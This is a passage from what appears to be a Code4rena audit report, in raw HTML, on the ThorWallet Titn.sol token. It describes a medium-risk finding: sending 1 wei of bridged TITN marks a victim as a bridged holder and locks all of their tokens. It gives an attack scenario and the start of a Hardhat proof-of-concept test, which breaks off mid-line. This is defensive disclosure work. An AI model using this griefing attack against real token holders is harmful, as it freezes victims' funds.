href=\"#medium-risk-findings-1\" aria-label=\"medium risk findings 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMedium Risk Findings (1)\u003c/h1\u003e\n\u003ch2 id=\"m-1-improper-transfer-restrictions-on-non-bridged-tokens-due-to-boolean-bridged-token-tracking-allowing-a-dos-attack-vector\" style=\"position:relative;\"\u003e\u003ca href=\"#m-1-improper-transfer-restrictions-on-non-bridged-tokens-due-to-boolean-bridged-token-tracking-allowing-a-dos-attack-vector\" aria-label=\"m 1 improper transfer restrictions on non bridged tokens due to boolean bridged token tracking allowing a dos attack vector permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-7\"\u003e[M-1] Improper Transfer Restrictions on Non-Bridged Tokens Due to Boolean Bridged Token Tracking, Allowing a DoS Attack Vector\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-125\"\u003eLimbooo\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-680\"\u003e0xAadi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-40\"\u003e0xAsen\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-51\"\u003e0xAsen\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-128\"\u003e0xastronatey\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-559\"\u003e0xcrazyboy999\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-759\"\u003e0xdoichantran\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-577\"\u003e0xhp9\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-416\"\u003e0xIconart\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-756\"\u003e0xlemon\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-132\"\u003e0xloscar01\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-691\"\u003e0xMosh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-578\"\u003e0xTonraq\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-612\"\u003e0xvd\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-611\"\u003e0xyuri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-231\"\u003e4B\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-194\"\u003eAbdessamed\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-438\"\u003eAbdul\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-531\"\u003eagadzhalov\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-499\"\u003eAgorist\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-98\"\u003ealdarion\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-412\"\u003eAlekso\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-33\"\u003eArjuna\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-67\"\u003earnie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-53\"\u003eattentioniayn\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-476\"\u003ebani\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-145\"\u003eBenterkiii\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-370\"\u003eBz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-46\"\u003eclassic-k\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-767\"\u003eDaniel_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-127\"\u003eDaniel526\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-751\"\u003edobrevaleri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-650\"\u003edoublekk\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-651\"\u003eeLSeR17\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-735\"\u003eEPSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-749\"\u003efalconhoof\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-79\"\u003efarismaulana\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-260\"\u003efelconsec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-788\"\u003efrancoHacker\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-381\"\u003egesha17\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-335\"\u003eginlee\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-716\"\u003eHappyTop0603\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-238\"\u003ehearmen\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-239\"\u003ehearmen\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-633\"\u003eHeavyweight_hunters\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-580\"\u003ehyuunn\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-637\"\u003ehyuunn\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-623\"\u003eiam_emptyset\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-368\"\u003eiamandreiski\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-227\"\u003eIlloy-Scizceneghposter\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-524\"\u003einh3l\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-646\"\u003eIshenxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-387\"\u003ejesjupyter\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-168\"\u003ejsonDoge\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-257\"\u003eka14ar\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-346\"\u003ekn0t\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-502\"\u003eKupiaSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-229\"\u003elanyi2023\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-474\"\u003elaxraw\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-385\"\u003eleegh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-414\"\u003ematrix_0wl\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-243\"\u003emisbahu\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-8\"\u003emontecristo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-378\"\u003eMSK\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-808\"\u003eMylifechangefast_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-525\"\u003eMysteryAuditor\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-647\"\u003eNHristov\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-521\"\u003ePabloPerez\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-119\"\u003epairingfriendly\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-264\"\u003epatitonar\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-655\"\u003epeanuts\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-460\"\u003ephoenixV110\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-538\"\u003eREKCAH\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-91\"\u003eSabit\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-398\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-487\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-408\"\u003eSherlock__VARM\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-557\"\u003eShipkata494\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-151\"\u003esilver_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-164\"\u003eSpicyMeatball\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-506\"\u003etheboiledcorn\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-511\"\u003etheboiledcorn\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-52\"\u003eundefined_joe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-425\"\u003evladi319\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-115\"\u003eweb3km\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-673\"\u003eX0sauce\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-357\"\u003ey4y\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-305\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-172\"\u003eZach_166\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-626\"\u003ezzykxx\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L106-L108\"\u003ehttps://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L106-L108\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L82-L83\"\u003ehttps://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L82-L83\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-2\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-2\" aria-label=\"finding description and impact 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003e \u003cstrong\u003eRoot Cause\u003c/strong\u003e\nThe \u003ccode\u003eTitn.sol\u003c/code\u003e contract incorrectly tracks bridged token holders using a boolean flag (\u003ccode\u003eisBridgedTokenHolder\u003c/code\u003e). Once an address receives \u003cem\u003eany\u003c/em\u003e bridged tokens (via cross-chain bridging), it is permanently marked as a “bridged token holder,” subjecting \u003cstrong\u003eall\u003c/strong\u003e tokens held by that address (including non-bridged ones) to transfer restrictions. This flawed design allows malicious actors to disrupt legitimate users by sending them a trivial amount of bridged tokens, thereby locking their entire TITN balance from being transferred freely.\u003c/p\u003e\n\u003cp\u003e \u003cstrong\u003eImpact\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLoss of User Control\u003c/strong\u003e: Users holding both bridged and non-bridged tokens cannot transfer \u003cem\u003eany\u003c/em\u003e tokens unless sending them to the LayerZero endpoint or \u003ccode\u003etransferAllowedContract\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDenial-of-Service (DoS) Attack Vector\u003c/strong\u003e: An attacker can send 1 wei of bridged TITN to any address, permanently locking their TITN tokens (even those obtained through non-bridged means).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProtocol Functionality Breakdown\u003c/strong\u003e: The intended economic model (allowing free transfer of non-bridged tokens) is violated, undermining user trust and utility.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch3 id=\"proof-of-concept-2\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003e \u003cstrong\u003eCode References\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBridged Token Tracking (Incorrect Boolean):\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L106-L108\"\u003e\u003ccode\u003eTitn.sol#L106-L108\u003c/code\u003e\u003c/a\u003e:  \u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis marks \u003ccode\u003e_to\u003c/code\u003e as a bridged holder upon receiving \u003cem\u003eany\u003c/em\u003e bridged tokens.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOverly Restrictive Transfer Validation:\u003c/strong\u003e\u003cbr\u003e\n\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L82-L83\"\u003e\u003ccode\u003eTitn.sol#L82-L83\u003c/code\u003e\u003c/a\u003e:  \u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echainid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbitrumChainId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elzEndpoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf \u003ccode\u003efrom\u003c/code\u003e is marked as a bridged holder (even for 1 wei), transfers are blocked unless sent to \u003ccode\u003elzEndpoint\u003c/code\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e \u003cstrong\u003eAttack Scenario\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMalicious User Action\u003c/strong\u003e:  \u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAttacker bridges 1 wei of TITN to Victim’s address on Base.  \u003c/li\u003e\n\u003cli\u003eVictim is now marked as \u003ccode\u003eisBridgedTokenHolder[Victim] = true\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eVictim’s Attempted Transfer\u003c/strong\u003e:  \u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eVictim holds 1000 non-bridged TITN tokens.  \u003c/li\u003e\n\u003cli\u003eTries to transfer 1000 TITN to another address (not \u003ccode\u003elzEndpoint\u003c/code\u003e or \u003ccode\u003etransferAllowedContract\u003c/code\u003e).  \u003c/li\u003e\n\u003cli\u003eTransaction reverts with \u003ccode\u003eBridgedTokensTransferLocked()\u003c/code\u003e, even though all tokens are non-bridged.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e \u003cstrong\u003eCoded Proof of Concept\u003c/strong\u003e\n\u003ccode\u003e./test/hardhat/Titn.test.ts\u003c/code\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"9\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;malicious user can bridged token to others to lock thier non-bridged tokens\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// mint non-bridged TITN to victim (Base)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictimNonBridgedTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictimNonBridgedTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efalse\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// mint TITN to attacker (Arb)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// await arbTITN.connect(ownerB).transfer(attacker.address, 